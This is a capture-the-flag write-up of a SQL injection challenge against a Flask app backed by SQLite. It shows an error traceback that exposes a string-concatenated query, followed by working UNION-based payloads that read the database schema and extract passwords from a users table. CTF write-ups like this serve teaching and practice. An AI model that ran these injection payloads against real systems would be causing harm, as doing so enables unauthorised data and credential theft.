# Meet The Union
Meet the union was a simple sql injection challenge on a flask application.

Unlike the other web challenge we were not given the source code. Despite this the challenge was quite straightforward.

## Recon
Upon visiting the pain page we can view the team members, clicking on one of them we can see the url takes an id parameter.
Based off the name we assumed this was a sql based injeciton, because the application was python based (flask to be exact), it was a fair bet the website was using sqlite3 as its
database. This is 100% an assumption based of experience, nearly everytime we've seen a sql challenge with a flask app the backend has used sqlite3.

Testing our hypothosis we sent a single `'`, which got the following response;
```
Traceback (most recent call last):
  File "unionflaggenerator.py", line 49, in do_GET
    cursor.execute("SELECT id, name, email FROM users WHERE id=" + params["id"])
sqlite3.OperationalError: unrecognized token: "'"
```

This gives us both the sql querry and confirms our assumption about sqlite3

## Exploitation
Using a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
we could extract table names. We had to modify it slightly to make it work but the following querry returned a list of tables;
```
/?id=69 union select 2,(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'),(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users')
```
This got us the table name `users`, using this we could get the flag with the following payload;
```
/?id=69 or 1=1 union select 1,(select password from users ),1
```

## Closing notes
* The creator of the challenge later pointed out to us that the union statement was meant to be a reference to both the CTF (Union CTF) and the challenge name.
* We did initially try the users table, however we apperantly made some mistake in our payload causing a false negative.
